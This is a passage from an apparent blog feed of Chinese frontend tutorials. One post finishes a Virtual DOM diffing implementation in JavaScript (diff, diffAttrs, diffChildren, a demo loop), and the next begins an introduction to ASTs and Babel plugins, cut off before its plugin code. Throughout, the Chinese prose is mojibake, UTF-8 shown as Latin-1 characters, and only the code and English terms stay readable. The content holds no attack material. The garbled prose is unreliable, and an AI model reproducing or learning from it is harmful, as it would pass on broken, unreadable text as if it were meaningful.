Virtual Nodeï¼Œæ‰€ä»¥ç•¶ç„¶æœƒ !==      // Case 2ï¼šæ˜¯å…©è€…éƒ½ç‚º stringï¼Œä½† !==      // æˆ‘å€‘ç›´æ¥æ ¹æ“šæ–°çš„ Virtual Tree render æ–°çš„ Real Treeï¼Œä¸¦ replace æ‰åŸæœ¬çš„ Real Tree      return rNode =&gt; &#123;          // å›å‚³ patch å‡½æ•¸          const rNewNode = render(newVTreeRoot);          rNode.replaceWith(rNewNode);          return rNewNode;       &#125;;    &#125; else &#123;      // è‹¥éƒ½ç‚º string ä¸”å€¼ç›¸åŒï¼Œé‚£å°±ä¸ç”¨æ”¹ã€‚      return rNode =&gt; rNode; // å›å‚³ patch å‡½æ•¸    &#125;  &#125;  if (oldVTreeRoot.tagName !== newVTreeRoot.tagName) &#123;    // æ ¹æ“šå„ªåŒ– Tree diffing æ¼”ç®—æ³•çš„å‡è¨­ä¸€ï¼Œåªè¦ tagName ä¸åŒï¼Œæˆ‘å€‘å°±ç›´æ¥é‡æ–° renderã€‚    return rNode =&gt; &#123;      // å›å‚³ patch å‡½æ•¸      const rNewNode = render(newVTreeRoot);      rNode.replaceWith(rNewNode);      return rNewNode;    &#125;;  &#125;  // ...&#125;;export default diff;

è°æ˜çš„ä½ çœ‹åˆ°é€™é‚Šå°±æœƒç™¼å•äº†ï¼štag name ç›¸åŒçš„ case æ²’æœ‰è™•ç†åˆ°å•Šï¼Ÿ
æ²’éŒ¯ï¼Œå¦‚æœæ–°èˆŠå…©æ£µ Virtual Tree çš„ tag name éƒ½ä¸€æ¨£ï¼Œé‚£æˆ‘å€‘é‚„å¾—æ¯” attributesï¼Œè€Œè¦æ¯”è¼ƒå…©å€‹ç¯€é»çš„æ‰€æœ‰ attributesï¼Œä¸å¦‚ç›´æ¥ replace ä¸Šæ–°çš„å°±å¥½ã€‚ä½†è¦æ³¨æ„ï¼Œå› ç‚º attributes å¾ˆå¤šï¼Œæ‰€ä»¥æœƒç”¢ç”Ÿå¤šå€‹ patch å‡½æ•¸éœ€è¦è¢« apply åˆ° Real DOM ä¸Šï¼Œæˆ‘å€‘é¡å¤–ç”¨ä¸€å€‹é™£åˆ—æš«å­˜ï¼Œæœ€å¾Œå›å‚³ä¸€å€‹ wrapper patch å‡½æ•¸ï¼ŒæŠŠæ‰€æœ‰æš«å­˜çš„ patch å‡½æ•¸éƒ½ apply åˆ°å‚³é€²ä¾†çš„ Real DOM ï¼š
diffAttrs.jsconst diffAttrs = (oldAttrs, newAttrs) =&gt; &#123;  // å› ç‚º attributes å¾ˆå¤šï¼Œéœ€è¦ä¸€å€‹ array ä¾†å­˜æ‰€æœ‰éœ€è¦çš„ patch å‡½æ•¸  const patches = [];  // æ”¾ä¸Šæ–°çš„ attributes  for (const [k, v] of Object.entries(newAttrs)) &#123;    patches.push(rNode =&gt; &#123;      // æš«å­˜ patch å‡½æ•¸      rNode.setAttribute(k, v);      return rNode;    &#125;);  &#125;  // ç§»é™¤èˆŠçš„ attributes  for (const k in oldAttrs) &#123;    if (!(k in newAttrs)) &#123;      patches.push(rNode =&gt; &#123;        // æš«å­˜ patch å‡½æ•¸        rNode.removeAttribute(k);        return rNode;      &#125;);    &#125;  &#125;  // æœ€å¾Œå‚³å‡ºå»çš„å¤–å±¤ patch å‡½æ•¸  return rNode =&gt; &#123;    for (const patch of patches) &#123;      // æŠŠæ¯å€‹æš«å­˜çš„ patch å‡½æ•¸éƒ½ apply åˆ° Real DOM ä¸Š      patch(rNode);    &#125;    return rNode;  &#125;;&#125;;export default diffAttrs;

è™•ç†å®Œ attributes å¾Œï¼Œæˆ‘å€‘é‚„å¾—è€ƒæ…® childrenï¼Œdiff children çš„æ–¹å¼å…¶å¯¦è·Ÿ diff æ•´æ£µæ¨¹ä¸€æ¨£ï¼Œä½†æˆ‘å€‘è¦è€ƒæ…®åˆ°å­æ¨¹çš„é•·åº¦ï¼š

oldVChildren.length === newVChildren.lengthï¼Œé‚£å°±ç›´æ¥ diff(oldVChildren[i], newVchildren[i])ï¼Œi å¾ 0 åˆ° oldVChildren.lengthã€‚
oldVChildren.length &gt; newVChildren.lengthï¼Œè·Ÿ case 1 å…¶å¯¦ä¸€æ¨£ï¼Œå› ç‚ºæ–°å­æ¨¹æ¯”è¼ƒå°‘ï¼Œå°±ä»£è¡¨æœ‰ Node è¢«åˆªé™¤ï¼Œåœ¨æˆ‘å€‘åŸæœ¬çš„ diff å‡½å¼ä¸­æœ‰è™•ç†äº†ã€‚
oldVChildren.length &lt; newVChildren.lengthï¼Œæ–°å­æ¨¹æ¯”è¼ƒé•·ï¼Œé‚£å°±å…ˆæŠŠèˆŠå­æ¨¹çš„æ‰€æœ‰é»å…ˆ update å¥½ï¼Œå†æŠŠå‰©é¤˜çš„æ–°å­æ¨¹ patch ä¸Šå»ã€‚

å¾ä¸Šè¿°ä¸‰å€‹ cases ä¾†çœ‹ï¼Œæˆ‘å€‘æ©«è±éƒ½éœ€è¦ loop oldVChildren ä¸€æ¬¡ï¼Œæœ€å¾Œè‹¥æœ‰å¤šé¤˜çš„ newVChildren å†æƒ³è¾¦æ³• update ä¸Šå»ã€‚å¦å¤–ï¼Œé€™é‚Šä¸€æ¨£éœ€è¦æš«å­˜å¤šå€‹ patch å‡½æ•¸ï¼Œå¯¦ä½œç´°ç¯€æˆ‘è¨»è§£åœ¨ code è£¡æ¯”è¼ƒæ¸…æ¥šï¼Œæœ€å¾Œå›å‚³çš„ patch å‡½æ•¸æ¯”è¼ƒç‰¹åˆ¥ï¼š
diffChildren.jsconst diffChildren = (oldVChildren, newVChildren) =&gt; &#123;  // ç„¡è«–å¦‚ä½•éƒ½ loop é oldVChildren ä¸€æ¬¡ï¼ŒæŠŠæ‰€æœ‰ diff å›å‚³çš„ patch å‡½æ•¸æš«å­˜åœ¨ childrenPatches å…§  // é€™æ˜¯ä¸€å®šæœƒ apply åˆ° old tree çš„éƒ¨åˆ†ã€‚  const childPatches = [];  oldVChildren.forEach((oldVChild, i) =&gt; &#123;    childPatches.push(diff(oldVChild, newVChildren[i]));  &#125;);  // æ¥è‘—æˆ‘å€‘çœ‹çœ‹ `newVChildren` æ˜¯å¦æœ‰å¤šé¤˜çš„å­æ¨¹éœ€è¦è™•ç†  // è‹¥æœ‰ï¼Œæˆ‘å€‘ç”¢ç”Ÿçš„ patch å‡½æ•¸å°±æ˜¯å–®ç´” `render` å‡º Real Node ä¸¦ä¸”  // appendChild åˆ° patch å‚³é€²çš„ Real Node ä¸Šï¼ˆå¯¦éš›è¦è¢« patch çš„ parent ç¯€é»ï¼‰  const additionalPatches = [];  for (const additionalVChild of newVChildren.slice(oldVChildren.length)) &#123;    additionalPatches.push(rNode =&gt; &#123;      rNode.appendChild(render(additionalVChild));      return rNode;    &#125;);  &#125;  return rParent =&gt; &#123;    // ç”±æ–¼é€™æ˜¯ children çš„ patchï¼Œåƒé€²ä¾†çš„æœƒæ˜¯ parent çš„ Real DOM    // æˆ‘å€‘è¦æŠ“å‡º `rParent.childNodes` ä¾†é‡å° old tree åš patch    // zip å‡½æ•¸å…¶å¯¦å°±æ˜¯ lodash çš„ zipï¼Œæˆå°å°‡ childPatches, rParent.childNodes çš„å…ƒç´ ä¸¦æ’å‚³å‡ºï¼Œé€™æ¨£æ¯”è¼ƒç°¡æ½”    for (const [patch, rChild] of zip(childPatches, rParent.childNodes)) &#123;      patch(rChild);    &#125;    // æœ€å¾ŒæŠŠ new tree å¤šé¤˜çš„ patches ç›´æ¥ patch åˆ° parent çš„ Real DOM ä¸‹å³å¯ï¼ˆå› ç‚ºæˆ‘å€‘æ˜¯ appendChildï¼‰    for (const patch of additionalPatches) &#123;      patch(rParent);    &#125;    return rParent;  &#125;;&#125;;

æœ€å¾Œåœ¨æˆ‘å€‘åŸæœ¬çš„ diff.js ä¸­çš„æœ€å¾Œé¢åŠ ä¸Šï¼š
diff.jsimport render from &#x27;./render&#x27;;const diff = (oldVTreeRoot, newVTreeRoot) =&gt; &#123;  if (newVTreeRoot === undefined) &#123;    // ....  &#125;  if (typeof oldVTreeRoot === &#x27;string&#x27; ||    typeof newVTreeRoot === &#x27;string&#x27;) &#123;    if (oldVTreeRoot !== newVTreeRoot) &#123;      // ....    &#125; else &#123;      // ....    &#125;  &#125;  if (oldVTreeRoot.tagName !== newVTreeRoot.tagName) &#123;      // ....  &#125;  const patchAttrs = diffAttrs(oldVTreeRoot.attrs, newVTreeRoot.attrs);  const patchChildren = diffChildren(oldVTreeRoot.children, newVTreeRoot.children);  return rNode =&gt; &#123;    patchAttrs(rNode);    patchChildren(rNode);    return rNode;  &#125;;&#125;;export default diff;

å®Œæ•´çš„ diff code å¯ä»¥çœ‹é€™é‚Š codesandbox
åˆ°é€™é‚Šç‚ºæ­¢ï¼ŒVirtual DOM ç®—æ˜¯å‘Šä¸€æ®µè½äº†ï¼
æœ€å¾Œä¿®æ”¹ä¸‹ main.jsï¼Œåšé»è®ŠåŒ–è®“å¤§å®¶çœ‹è£½ä½œå‡ºçš„ VDOM æ•ˆæœæˆ‘å€‘è®“ createVApp æŸ¯é‡ŒåŒ–ï¼Œå¤šå‚³ä¸€å€‹åƒæ•¸ count é€²å»æ”¹è®Š attributes è·Ÿåœ–ç‰‡å°ºå¯¸ï¼Œæ¥è‘— setInterval è®“æ¯å…©ç§’ç”¢ç”Ÿä¸€å€‹éš¨æ©Ÿæ•¸å­—ç•¶ä½œ count å€¼ï¼Œç”¨ä¾† update æˆ‘å€‘çš„ç¯€é»ï¼š
main.jsconst createVApp = count =&gt; createElement(&#x27;div&#x27;, &#123;  attrs: &#123;    id: &#x27;root&#x27;,    dataCount: count, // we use the count here  &#125;,  children: [    &#x27;Hello Kitty&#x27;,    createElement(&#x27;img&#x27;, &#123;      attrs: &#123;        src: `http://placekitten.com/$&#123;count&#125;00/$&#123;count&#125;00`,      &#125;,    &#125;),  ],&#125;);let vApp = createVApp(0);const rApp = render(vApp);let rRootEl = mount(rApp, document.getElementById(&#x27;rootApp&#x27;));setInterval(() =&gt; &#123;  const n = Math.floor(Math.random() * 10);  const vNewApp = createVApp(n);  const patch = diff(vApp, vNewApp);  // æ¯æ¬¡ patch å®Œå°± assgin å›åŸæœ‰è®Šæ•¸ï¼Œé€™æ¨£ä¸‹å€‹ interval æ‰æœƒæŠ“åˆ°æ›´æ–°çš„æ¨¹  rRootEl = patch(rRootEl);  vApp = vNewApp;&#125;, 2000);

æ•ˆæœå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åœ–ç‰‡ä¸€ç›´è®Šå‹•ï¼Œä½†æ˜¯æˆ‘å€‘çœŸçš„åªæ”¹åˆ°äº†éœ€è¦æ”¹çš„ç¯€é»èˆ‡ attributesï¼Œä¸¦ä¸æœƒæ•´å€‹é é¢é‡æ–°åˆ·æ–°ï¼š

çµè«–é›–ç„¶æ²’è¾¦æ³•è·Ÿå¸‚é¢ä¸Šå¯¦éš›çš„ VDOM ç›¸æä¸¦è«–ï¼Œä½†æ˜¯å¾é€™ç°¡å–®çš„å¯¦ä½œå¯ä»¥å¾ˆæ¸…æ¥šçš„çŸ¥é“æ•´å€‹æ¦‚å¿µèˆ‡è¦è§£æ±ºçš„å•é¡Œï¼Œæˆ‘è¦ºå¾—æ˜¯è »ä¸éŒ¯çš„å°ç·´ç¿’ï¼Œæ¥ä¸‹ä¾†å†å»çœ‹ React æˆ–æ˜¯ Vue åœ¨é€™æ–¹é¢çš„å¯¦ä½œæ‡‰è©²æœƒæ¯”è¼ƒæœ‰é ­ç·’ä¸€äº›ï¼æœ€å¾Œå†é™„ä¸Šä¸€æ¬¡ codesandbox é€£çµè®“æƒ³ç©çš„äººç›´æ¥è©¦è©¦ï¼šcodesandbox
è³‡æ–™ä¾†æº
Video: Building a Simple Virtual DOM from Scratch - Jason Yu
Blog: Building a Simple Virtual DOM from Scratch - Jason Yu
React æºç¢¼å‰–æç³»åˆ— ï¼ ä¸å¯æ€è­°çš„ react diff
æ·±åº¦å‰–æï¼šå¦‚ä½•å®ç°ä¸€ä¸ª Virtual DOM ç®—æ³•

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>web</tag>
        <tag>react</tag>
        <tag>javascript</tag>
        <tag>virtual dom</tag>
      </tags>
  </entry>
  <entry>
    <title>é€éè£½ä½œ Babel-plugin åˆè¨ª AST</title>
    <url>/2018/09/22/visit-ast-with-babel-plugin/</url>
    <content><![CDATA[å‰è¨€æœ€è¿‘å…¬å¸åŒäº‹çµ„äº† Design pattern çš„è®€æ›¸æœƒï¼Œå‰›å¥½é€™é€±ç ”è®€åˆ° Visitor Pattern æ™‚ï¼ŒåŒäº‹ä»‹ç´¹èªªæˆ‘å€‘æ¯å¤©åœ¨ç”¨çš„å·¥å…· Babel å°±æ˜¯æ¡ç”¨ Vistor Patternï¼Œé€é visitor æ‹œè¨ª AST (Abstract Syntax Tree)ï¼Œé€²è€Œå°‡ç¨‹å¼ç¢¼é€²è¡Œå°æ‡‰è½‰æ›ã€‚
é€™é™¤äº†å‹¾èµ·æˆ‘å‰é™£å­æƒ³è¦äº†è§£ AST çš„æƒ³æ³•å¤–ï¼Œä¹Ÿå†åº¦æé†’æˆ‘å°æ–¼ Babel Plugin èƒŒå¾Œçš„å¯¦ä½œæ–¹å¼ä¸å¤ªäº†è§£ï¼ŒåªçŸ¥é“åƒæ˜¯ ESLint, UglifyJS æˆ–æ˜¯ Webpackï¼Œä»–å€‘çš„æ ¸å¿ƒéƒ½æ˜¯ç”¨åˆ°äº† AST ä¾†å¯¦ç¾ç¨‹å¼ç¢¼çš„æª¢æŸ¥ã€åˆ†æèˆ‡æ“ä½œï¼Œä½†ä¸¦ä¸æ›‰å¾—å¯¦éš›ä¸Šè¦å¦‚ä½•ä½¿ç”¨ã€‚
æ­¤å¤–ï¼Œæˆ‘å…ˆå‰å…¶å¯¦éƒ½æ²’æœ‰æƒ³éè¦è‡ªå·±å¯« Babel Pluginï¼Œç¸½è¦ºå¾— Babel çš„ Plugin å°±æ˜¯è¦å¾ˆä¸€èˆ¬åŒ–ï¼Œå¤§å®¶éƒ½èƒ½ä½¿ç”¨çš„ï¼Œä½†å…¶å¯¦ä¸ç„¶å•Šï¼Œè‡ªå·±çš„å°ˆæ¡ˆæˆ–ç”šè‡³æ˜¯å…¬å¸åœ˜éšŠå…§çš„å°ˆæ¡ˆï¼Œåªè¦èƒ½æœ‰åŠ©æ–¼å¤§å®¶çš„å·¥ä½œæ•ˆç‡ï¼Œå°±ç®—åªçµ¦å…§éƒ¨ä½¿ç”¨åˆä½•å¦¨ï¼Ÿæ˜ç¢ºå®šç¾©å¥½ä½¿ç”¨çš„æƒ…å¢ƒè·Ÿ Style å³å¯ã€‚
å› æ­¤é€™æ¬¡å°±æ±ºå®šèŠ±é»æ™‚é–“ä¾†å­¸ç¿’å¦‚ä½•å¯¦ä½œ Babel Pluginï¼Œä¸¦é€éå¯¦ä½œ Babel Plugin çš„éç¨‹ï¼Œä¸€åŒäº†è§£ AST çš„æ¦‚å¿µã€‚
ä¸€ç›´æåˆ° ASTï¼Œåˆ°åº•ä»€éº¼æ˜¯ ASTï¼ŸAST çš„å…¨æ–‡æ˜¯ Abstract Syntax Treeï¼Œä¸­æ–‡å¤§å¤šç¿»ä½œæŠ½è±¡èªæ³•æ¨¹ï¼Œä¸»è¦æ˜¯å°‡æˆ‘å€‘ äººé¡ æ‰€å¯«çš„ç¨‹å¼èªæ³•ï¼Œè½‰æ›æˆ ç¨‹å¼ æ¯”è¼ƒå®¹æ˜“é–±è®€çš„èªæ³•çµæ§‹ï¼Œä¸¦ä»¥æ¨¹çš„è³‡æ–™çµæ§‹ä¾†å„²å­˜ã€‚
ç›´æ¥ä¾†å€‹ä¾‹å­ï¼Œå…ˆè®“å¤§å®¶çœ‹çœ‹ çµ¦äººé¡çœ‹çš„ code èˆ‡ çµ¦ç¨‹å¼è®€çš„ code ä¹‹é–“çš„å·®ç•°ï¼š

å·¦é‚Šçš„ç¨‹å¼ç¶“é Parser çš„è½‰æ›å¾Œï¼Œå°±æœƒç”¢å‡ºå³åœ–ä¸­çš„ ASTã€‚
åœ¨é å¤çš„ Nestcape æ™‚ä»£ï¼Œå°æ–¼ Javascript çš„ AST æœ‰è¨±å¤šç¨®å¯¦ä½œï¼Œè€Œå¾Œä¾†ç‚ºäº†è§£æ±ºä¸€è‡´æ€§çš„å•é¡Œï¼ŒESTree é€™å€‹çµ„ç¹”å®šç¾©äº†ç¾ä»Šé€šç”¨çš„ AST specificationã€‚
åƒæ˜¯æˆ‘å€‘ç¾åœ¨å¸¸ç”¨çš„ Babel æ‰€ä½¿ç”¨çš„ AST å°±æ˜¯åŸºæ–¼ ESTree çš„è¦ç¯„å»¶ä¼¸ä¿®æ”¹çš„ã€‚
é‚£ Babel é€™äº›å·¥å…·åˆ°åº•æ‹¿ AST ä¾†åšä»€éº¼å‘¢ï¼Ÿç¨ç¨å›æƒ³ä¸€ä¸‹ï¼ŒBabel æˆ–æ˜¯ ESLint åœ¨æˆ‘å€‘å¹³æ—¥çš„é–‹ç™¼ä¸­æ‰®æ¼”äº†ä»€éº¼è§’è‰²ï¼Ÿ
æƒ…å¢ƒå¤§æ¦‚æ˜¯ï¼š

ä½ ç”¨ ES6 å¯«äº†ä¸€æ®µ arrow functionï¼Œè€Œ Babel æœƒå¹«å¿™è½‰æ›æˆ ES5 çš„åŒ¿åå‡½æ•¸ï¼ŒåŒæ™‚ ESLint å¯èƒ½æœƒé¡¯ç¤º Warning å‘ŠçŸ¥ä½ çš„æ‹¬è™Ÿå‰é¢å¿…é ˆè¦ç•™æœ‰ç©ºæ ¼ã€‚

é€™æ®µæè¿°ç•¶ä¸­ï¼ŒBabel å…¶å¯¦å°‡ä½ çš„ code é€éä¸‰å€‹ stage ä¾†è™•ç†ï¼šparse, transform, generate.
è€Œå…¶ä¸­ï¼ŒAST å…¶å¯¦å°±å‡ºç¾äº†å…©æ¬¡ï¼š



Parse stage
ä½ å¯«çš„ js code æœƒç¶“ç”± js parser è½‰æ›ç‚º ASTï¼Œç•¶ç„¶å…¶ä¸­æœƒé€é Lexical Analysis èˆ‡ Syntactic Analysisã€‚

Transform stage
è€Œé€™æ™‚ Babel plugin èˆ‡ ESLint plugin å°±å¯ä»¥ä»‹å…¥ä½ çš„ç¨‹å¼é€²è¡Œæ”¹é€ ï¼Œå¹«å¿™è½‰æ›æˆ ES5 çš„åŒ¿åå‡½æ•¸ä»¥åŠå¯©è¦–ä½ çš„ç¨‹å¼ï¼Œæ±ºå®šæ˜¯å¦è¦æç¤º Warning çš„é€™å…©å€‹å‹•ä½œå°±æ˜¯åœ¨é€™å€‹éšæ®µç™¼ç”Ÿçš„ï¼Œæˆ‘å€‘å°‡ Parser è§£æå¾Œçš„ AST æ”¹é€ æˆæˆ‘å€‘æƒ³è¦çš„æ¨£å­ã€‚

Generate stage
æœ€å¾Œï¼Œæ”¹é€ å®Œæˆçš„ AST æœƒå†è¢« generator è½‰æ›ç‚ºä¸€èˆ¬çš„ code è¼¸å‡ºã€‚


å¸¸ç”¨çš„ js parser æœ‰å¾ˆå¤šç¨®ï¼Œåƒæ˜¯ babylon, acorn, esprima ç­‰ç­‰ï¼Œè€Œæ‰€è¬‚çš„ Babel plugin æˆ–æ˜¯ ESLint pluginï¼Œå‰‡å¯ä»¥çœ‹ä½œæ˜¯ä¸€ç¨® Transformerã€‚
çªºæ¢ä¸€ä¸‹ AST çš„å…§å®¹åœ¨å¯¦ä½œ Plugin å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹ AST çš„é•·ç›¸å°ä¹‹å¾Œæœƒæ¯”è¼ƒæœ‰å¹«åŠ©ã€‚
é–‹å§‹ä¹‹å‰å…ˆä»‹ç´¹å…©å€‹å¸¸ç”¨ç¶²ç«™ï¼š

AST Exporler
è¶…æ£’çš„ç¶²ç«™ï¼Œåœ¨ä¸Šé¢å¯ä»¥é‚Šçœ‹åŸå§‹ç¨‹å¼ç¢¼æ ¹æ“šä¸åŒ Parser æ‰€å»ºæ§‹å‡ºä¾†çš„ ASTï¼Œä¹Ÿèƒ½åˆ‡æ›ä¸åŒ Transformer ä¾†å¯¦ä½œ Plugin å…§å®¹ã€‚

JAVASCRIPT AST VISUALIZER
ä¸»è¦æ˜¯å°‡ AST è¦–è¦ºåŒ–ï¼Œå°æ–¼ç†è§£æ•´å€‹ç¨‹å¼ç¢¼çš„ AST çµæ§‹èƒ½æœ‰æ¯”è¼ƒæ¸…æ¥š Overviewã€‚


ä¸éæˆ‘å€‹äººæ˜¯è¦ºå¾— AST Exporler å°±è¶³å¤ äº†ï¼Œ VISUALIZER é›–ç„¶èƒ½çœ‹åˆ°åœ–åƒåŒ–çš„æ¨¹ç‹€çµæ§‹ï¼Œä½†æ“ä½œèµ·ä¾†ä¸æ˜¯å¾ˆé †æš¢ï¼Œä¹Ÿç„¡æ³•ç›´æ¥åœ¨ä¸Šé¢æ’°å¯« Transformerã€‚æ‰€ä»¥ä¸‹é¢éƒ½æœƒä»¥ AST Exporler ç‚ºä½¿ç”¨å·¥å…·ä¾†ä»‹ç´¹ã€‚
ç¾åœ¨æˆ‘å€‘ä»¥ä¸€å€‹æ¯”æœ€é–‹å§‹ç¨ç¨è¤‡é›œä¸€é»çš„ç°¡å–®ç¯„ä¾‹ä¾†è§£æï¼Œåœ¨é€™é‚Šæˆ‘å€‘æ¡ç”¨èˆ‡ Babel ç›¸åŒçš„ Parser - Babylon7ï¼š
æˆ‘å€‘çš„åŸå§‹ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼Œå®šç¾© a èˆ‡ b å…©å€‹è®Šæ•¸ï¼Œä»¥åŠä¸€å€‹ add functionï¼š
const a = 2const b = 3function add(a,b) &#123;  return a+b&#125;

ä¸€æ­¥ä¸€æ­¥ä¾†çœ‹ï¼Œconst a = 2 çš„ AST æœƒé•·é€™æ¨£ï¼š

ä½ çš„ç¨‹å¼ç¢¼åœ¨ AST ç•¶ä¸­ï¼Œæœƒè¢«æ‹†è§£æˆå„ç¨® node ä¾†å­˜æ”¾è¡¨ç¤ºï¼Œè€Œæ¯ä¸€å€‹ node éƒ½æœ‰è‡ªå·±çš„ typeï¼Œå„ç¨® type æœ‰å…¶ç‰¹å®šçš„å±¬æ€§åƒæ•¸ï¼Œä»¥ä¸Šåœ–ç‚ºä¾‹ï¼š
const åœ¨ AST ä¸­å°±æ˜¯ã„§å€‹ type ç‚º VariableDeclaration çš„ nodeï¼Œé€™å€‹ node å¿…é ˆåŒ…å«å…©ç¨®å±¬æ€§ï¼Œ declarations èˆ‡ kindï¼š
kind å¾ˆå¥½ç†è§£ï¼Œæ„æŒ‡æˆ‘å€‘çš„ VariableDeclaration å¯ä»¥æœ‰ä¸‰ç¨®é¡å‹ï¼ˆvar, let, constï¼‰ï¼Œ è€Œ declarations çœ‹èµ·ä¾†å°±æ˜¯å­˜æ”¾ä½ æ‰€å®£å‘Šçš„è®Šæ•¸ï¼Œåƒ a = 2ï¼Œä½†ä»–æ˜¯ Array of VariableDeclaratorï¼Œæˆ‘å€‘ä¸æ˜¯åªæœ‰å®£å‘Šä¸€å€‹è®Šæ•¸å—ï¼Ÿ
å…¶å¯¦æ˜¯è¦æ‡‰ä»˜é€™ç¨®å¯«æ³•ï¼šconst a = 2, b = 3ï¼Œéœ€è¦èƒ½æ¥æ”¶å¤šå€‹ VariableDeclaratorã€‚
è€Œ VariableDeclarator é€™ç¨® type çš„ node ä»£è¡¨çš„å°±æ˜¯ a=2 é€™ç¨®å®£å‘Šå¼ï¼Œå…¶ä¸­åŒ…å«å…©å€‹å±¬æ€§ id èˆ‡ initï¼Œæˆ‘å€‘å°‡å…¶å±•é–‹çœ‹çœ‹ï¼š

id å±¬æ€§æ‰€æ¥å—çš„æ˜¯ identifier é€™å€‹ type çš„ nodeï¼Œä»£è¡¨è©² VariableDeclarator çš„ identityã€‚è©² node åªéœ€è¦ä¸€å€‹ name å±¬æ€§ï¼Œä¹Ÿå°±æ˜¯ä»–çš„åç¨±ï¼Œåœ¨é€™é‚Šçš„ä¾‹å­ä¸­ç•¶ç„¶å°±æ˜¯ a å›‰ã€‚è€Œ init å‰‡æ˜¯é€™å€‹ VariableDeclarator çš„åˆå§‹å€¼ï¼Œå› ç‚ºæˆ‘å€‘ç¨‹å¼ä¸­æ˜¯åˆå§‹ a ç‚º 2ï¼Œæ‰€ä»¥é€™å€‹ init å±¬æ€§å°±æœƒé€£åˆ°ä¸€å€‹ NumericLiteral type çš„ nodeï¼Œæ“æœ‰ value ç‚º 2 çš„å±¬æ€§ã€‚
æ­¤å¤–ï¼Œçœ¼å°–çš„è®€è€…æƒ³å¿…éƒ½æœ‰ç™¼ç¾åˆ°ï¼Œæ¯å€‹ node éƒ½æœ‰ start, end èˆ‡ loc é€™ä¸‰å€‹å±¬æ€§ï¼Œé€™æ˜¯ç”¨ä¾†ä»£è¡¨è©² node åœ¨ç¨‹å¼çš„ç¬¬å¹¾è¡Œç¬¬å¹¾åˆ—ã€‚
çœ‹åˆ°é€™é‚Šæ‡‰è©²å°æ–¼ AST çš„çµæ§‹æœƒæœ‰é»æ„Ÿè¦ºäº†ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ Parser æœƒå…ˆå°‡ä½ çš„ç¨‹å¼åˆ‡æˆå¤šç¨® tokensï¼Œæ¥è‘—ä¾ç…§é¡åˆ¥ä¾†å€åˆ†æ˜¯å“ªç¨® nodeï¼Œæœ€å¾Œå¾ç¨‹å¼çµæ§‹ä¸Šä¸€ä¸€æŠŠ node ä¸²æ¥ï¼Œå½¢æˆä¸€é¡†å®Œæ•´çš„ Abstract Syntax Treeã€‚å¦‚æœè¦ºå¾—å‰›å‰›ç”¨ AST Explorer è½‰åŒ–çš„æ ¼å¼ä¸å¤ æ¸…æ¥šï¼Œé€™é‚Šè£œå……ä¸€ä¸‹åŒæ¨£ç¨‹å¼ç”¨ VISUALIZER å‡ºä¾†çš„ AST é•·ç›¸ï¼Œæ‡‰è©²æœƒå° AST çš„çµæ§‹æ›´æœ‰æ„Ÿå—ï¼š

ç¯„ä¾‹ç¨‹å¼ä¸­æˆ‘å€‘é‚„æœ‰ä½¿ç”¨åˆ° functionï¼Œä»–é•·å‡ºçš„ AST èˆ‡å®£å‘Šè®Šæ•¸åœ¨ node type ä¸Šæœ‰ä¸å°‘å·®ç•°ï¼Œä½†å¤§é«”çµæ§‹å°±å¦‚åŒä¸Šé¢ä»‹ç´¹çš„ä¸€èˆ¬ï¼Œé€™é‚Šå°±ä¸å†è´…è¿°ï¼Œç›¸ä¿¡çœ‹åˆ°é€™é‚Šçš„è®€è€…ä¹Ÿæœ‰èƒ½åŠ›è‡ªå·±å» AST Explorer ç©ç©çœ‹äº†ï¼å¯«äº›ç°¡å–®çš„ç¨‹å¼ï¼Œçœ‹çœ‹ä»–å€‘ç¶“ç”± Parser è½‰æ›å¾Œï¼Œæœƒç”¢ç”Ÿæ€æ¨£çš„ ASTï¼Œæ¯ç¨®èªæ³•æ‰€å°æ‡‰çš„ node type åˆæ˜¯ä»€éº¼ã€‚
æ‡‚äº† ASTï¼Œä¾†å¯¦éš›æ‡‰ç”¨ä¸€ä¸‹ï¼Œé–‹å§‹è£½ä½œ Babel Plugin å§ï¼å‡ºç™¼ï¼Œç¸½è¦æœ‰å€‹æ–¹å‘ã€‚
è¦åš Plugin ä¹Ÿå¾—è¦å…ˆæ±ºå®šè¦åšä»€éº¼ã€‚
å‰›å¥½åœ¨å·¥ä½œä¸Šå¸¸å¸¸æœƒç”¨åˆ° React-intl é€™å€‹å¥—ä»¶ä¾†å¹«å¿™è™•ç† i18nï¼Œä»–çš„ä½¿ç”¨æ–¹æ³•é‚„ç®—ç°¡å–®ï¼Œç•¶ä¸€äº›åŸºæœ¬è¨­å®šåšå¥½ä»¥å¾Œï¼Œä½ åªè¦ç”¨å…¶æä¾›çš„ä¸€å€‹ç‰¹æ®Šå…ƒä»¶ &lt;FormattedMessage /&gt;ï¼Œæ”¾å…¥å°æ‡‰æ–‡å­—çš„ id å³å¯ï¼Œåƒæ˜¯ï¼š &lt;FormattedMessage id=&quot;#words-need-i18n&quot; /&gt; ã€‚
é›–ç„¶å¯¦éš›ä¸Šå·²ç¶“éå¸¸ç°¡å–®äº†ï¼Œä½†æˆ‘é‚„æƒ³æ›´æ‡¶ä¸€é»ï¼Œèƒ½ä¸èƒ½ç›´æ¥è¼¸å…¥ &#123;&#39;#words-need-i18n&#39;&#125; å°±å¥½å‘¢ï¼Ÿ
åƒæ˜¯èƒ½æŠŠï¼š
&lt;div&gt;  &#123;&#x27;#words-need-i18n&#x27;&#125;&lt;/div&gt;

è½‰æ›æˆï¼š
&lt;div&gt;  &lt;FormattedMessage id=&quot;words-need-i18n&quot; /&gt;&lt;/div&gt;

å¯ä»¥ï¼è‡ªå·±å¯« Plugin å°±å¯ä»¥ï¼
